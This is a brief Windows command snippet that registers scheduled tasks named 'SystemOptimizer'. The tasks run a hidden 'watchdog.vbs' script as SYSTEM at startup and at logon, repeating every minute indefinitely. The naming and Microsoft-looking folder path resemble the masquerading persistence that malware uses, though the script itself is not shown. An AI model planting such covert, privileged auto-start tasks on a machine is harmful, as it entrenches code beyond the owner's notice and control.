$wd = "C:\Users\Death\AppData\Local\Microsoft\Windows\SystemOptimizer\watchdog.vbs"
schtasks /Create /TN "SystemOptimizer" /TR "wscript.exe \"$wd\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F
schtasks /Create /TN "SystemOptimizer-Logon" /TR "wscript.exe \"$wd\"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F
schtasks /Change /TN "SystemOptimizer" /RI 1 /DU 9999:59 /K /F